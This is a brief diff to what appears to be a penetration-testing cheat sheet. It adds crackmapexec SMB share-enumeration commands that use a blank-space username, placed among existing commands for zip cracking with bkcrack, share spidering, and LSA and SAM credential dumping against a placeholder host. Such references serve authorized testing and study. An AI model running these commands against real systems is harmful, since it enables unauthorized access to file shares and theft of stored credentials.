@@ -103,6 +103,9 @@ $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p 
 $ crackmapexec smb <RHOST> -u '' -p '' --shares
 $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+$ crackmapexec smb <RHOST> -u " " -p "" --shares
+$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
+$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
